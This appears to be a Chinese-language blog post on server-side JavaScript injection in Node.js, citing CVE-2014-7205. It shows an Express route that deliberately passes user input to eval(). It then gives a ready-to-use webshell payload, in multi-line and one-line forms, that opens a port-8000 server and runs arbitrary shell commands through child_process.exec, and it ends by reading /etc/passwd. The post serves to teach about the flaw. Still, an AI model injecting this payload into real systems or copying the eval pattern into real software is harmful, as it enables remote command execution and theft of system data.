我最近开始对真实世界的Node.js应用程序的安全感兴趣，我发现一种攻击方式，我命名为"服务端JS注入",我在 CVE-2014-7205发现了一个Node.js的Basmaster插件，允许任意JS注入。

我写了一个简单的demo程序，让用户的输入传递到eval(),我下面将演示如何注入一个简单的webshell。

漏洞代码如下：



router.post('/demo1', function(req, res) {
var year = eval("year = (" + req.body.year + ")");
var date = new Date();
var futureAge = 2050 - year;
res.render('demo1',
{
title: 'Future Age',
output: futureAge
});
});

通过漏洞代码，我们可以看到 res.write(‘SSJS Injection’) 是可以注入的，并且服务器会返回注入的信息

我们能注入一段webshell代码，监听在8000端口


setTimeout(function() {
require('http').createServer(function(req, res) {
res.writeHead(200, {
"Content-Type": "text/plain"
});
require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e, s, st) {
res.end(s);
});
}).listen(8000);
}, 5000)

写成一行


setTimeout(function() { require('http').createServer(function (req, res) { res.writeHead(200, {"Content-Type": "text/plain"});require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) {res.end(s);}); }).listen(8000); }, 5000)

因为我们是注入到eval()，webshell不能写硬盘，他将仅仅在已存在的node进程里执行。

使用webshell执行cat /etc/passwd
